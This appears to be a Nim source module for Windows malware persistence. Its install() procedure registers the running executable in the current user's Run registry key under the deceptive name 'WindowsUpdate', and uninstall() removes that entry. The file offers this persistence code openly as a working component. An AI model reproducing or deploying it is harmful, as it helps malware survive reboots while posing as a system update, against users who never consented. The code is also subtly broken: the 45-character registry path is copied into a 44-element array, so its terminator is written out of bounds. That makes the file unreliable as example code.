# persist.nim — Registry run-key persistence

import winim

var RUN_KEY_STR: array[44, uint16] = block:
  var a: array[44, uint16]
  let s = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  for i, c in s: a[i] = uint16(c)
  a[s.len] = 0
  a

var VAL_NAME: array[14, uint16] = block:
  var a: array[14, uint16]
  let s = "WindowsUpdate"
  for i, c in s: a[i] = uint16(c)
  a[s.len] = 0
  a

proc getExePathWide(): seq[uint16] =
  # unsafe
  var buf = newSeq[uint16](520)
  let len = GetModuleFileNameW(0.HMODULE, cast[LPWSTR](addr buf[0]), 520)
  buf.setLen(int(len) + 1)  # keep null
  buf

proc install*() =
  # unsafe — opens HKCU run key and sets own path
  var exe = getExePathWide()
  var hKey: HKEY = 0
  if RegOpenKeyExW(
    HKEY_CURRENT_USER,
    cast[LPCWSTR](addr RUN_KEY_STR[0]),
    0,
    KEY_SET_VALUE,
    addr hKey) != 0:
    return
  let byteLen = exe.len * 2
  discard RegSetValueExW(
    hKey,
    cast[LPCWSTR](addr VAL_NAME[0]),
    0,
    REG_SZ,
    cast[ptr BYTE](addr exe[0]),
    DWORD(byteLen))
  discard RegCloseKey(hKey)

proc uninstall*() =
  # unsafe
  var hKey: HKEY = 0
  if RegOpenKeyExW(
    HKEY_CURRENT_USER,
    cast[LPCWSTR](addr RUN_KEY_STR[0]),
    0,
    KEY_SET_VALUE,
    addr hKey) != 0:
    return
  discard RegDeleteValueW(hKey, cast[LPCWSTR](addr VAL_NAME[0]))
  discard RegCloseKey(hKey)
